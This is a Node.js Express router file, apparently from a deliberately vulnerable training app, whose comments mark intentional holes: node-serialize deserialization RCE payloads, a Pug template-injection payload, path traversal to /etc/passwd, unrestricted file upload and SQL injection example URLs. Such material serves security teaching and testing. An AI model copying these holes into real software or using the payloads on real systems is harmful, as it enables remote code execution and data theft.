const express = require('express'),
      router = express.Router(),
      serialize = require('node-serialize'),
      productService = require('../services/productService'),
      userService = require('../services/userService'),
      textContentService = require('../services/textContentService');
      
router.get('/home', async function (req, res) { 
  
    if(!req.session.isAdmin){
        res.send("Not authorized"); 
        return;       
    }
    
    const textContentResults = await textContentService.getWelcomeText();

    res.render('pages/admin', {
        welcomeMessage: textContentResults[0].WelcomeMessage,   
        isLoggedIn: req.session.isLoggedIn,
        isAdmin: req.session.isAdmin,
        email: req.session.email
    });
    
});

// #{7*7}
// #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec(''touch worksPug.txt'')}()}
router.post('/update-message', function (req, res) { 
    const welcomeMessage = req.body.welcomeMessage;
    textContentService.updateWelcomeText(welcomeMessage);
    res.send("Message Updated");
});


// serialization vunerablility requires npm install node-serialize@0.0.4
router.get('/serialize', function (req, res) {    
   
    var payload= {
        "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('touch testworks.txt');}()"
    }

    serialize.unserialize(serialize.serialize(payload))

    res.send("Works");
});

//LFI e.g. http://localhost:3000/get-image?imageName=../../../../../etc/passwd
router.get('/get-image', function (req, res) {
    const path = require ('path');
    var imageFile = path.join(__dirname, req.query.imageName);
    console.log(imageFile);
    res.sendFile(imageFile);
});

// serialization vunerablility requires npm install node-serialize@0.0.4
//{ "productName" : "testUpload", "smallImageUrl" : "1", "largeImageUrl" : "2" , "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('touch yay.txt');}()"}
router.post('/upload-product', async function (req, res) {    
   
    console.log(req.body.Product);

    var product = serialize.unserialize(req.body.Product);
    productService.add(product);

    res.send("Product Uploaded");
});

//unsecure file upload
router.post('/upload-images', (req, res) => {
    try {
        
        if (!req.files) {
            res.send({
                status: false,
                message: 'No file uploaded'
            });
        } else {
            let myFile = req.files.myFile;

            myFile.mv(path.join(__dirname, "uploads/" + myFile.name));

            res.send({
                status: true,
                message: 'File uploaded'
            });
        }
    } catch (err) {
        res.status(500).send(err);
    }
});

//sql injection
//http://localhost:3000/getuser?username=admin%27%20or%20username=%27user%27--%27
router.get('/getuser', async function (req, res) {   

    users = userService.get(req.query.username)
    res.send(users);
     
});

module.exports = router;